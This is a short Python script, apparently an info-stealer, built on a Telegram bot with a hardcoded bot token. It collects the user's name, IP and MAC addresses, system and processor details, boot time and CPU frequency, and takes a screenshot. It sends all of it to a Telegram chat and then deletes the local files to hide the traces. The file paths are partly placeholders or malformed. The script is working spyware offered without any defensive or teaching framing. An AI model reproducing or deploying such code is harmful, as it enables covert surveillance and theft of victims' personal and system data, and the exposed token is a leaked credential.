import telebot
import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
import platform
import psutil


bot = telebot.TeleBot("6224920011:AAEAwz4PsQW81G5dqJ61DATpZm2J7D0bXf4")
name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()

zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)

cpu = psutil.cpu_freq()

os.getcwd()

try:
    os.chdir(r"/temp/path")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()

    bot.polling()
    raise SystemExit

screen = pyautogui.screenshot("screenshot.jpg")

try:
    os.chdir(r"/temp/path")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()

    bot.polling()
    raise SystemExit

file = open("info.txt", "w")

file.write(f"{ost.system}\n Processor: {ost.processor}\n Username: {name}\n IP adress: {ip}\n MAC adress: {mac}\n Timezone: {time.year}/{time.month}/{time.day}\n Max Frequency: {cpu.max:.2f}")

text = "Screenshot"
@bot.message_handler(commands=['start'])
def start_message(message):
    upfile = open('C:Users\kiril\Documents\info.txt', "rb")
    uphoto = open("C:Users\kiril\Documents\screenshot.jpg", "rb")
    bot.send_photo(message.chat.id, uphoto, text)
    bot.send_document(message.chat.id, upfile)

    upfile.close()
    uphoto.close()

    os.remove("info.txt")
    os.remove("screenshot.jpg")

    bot.stop_polling()

bot.polling()
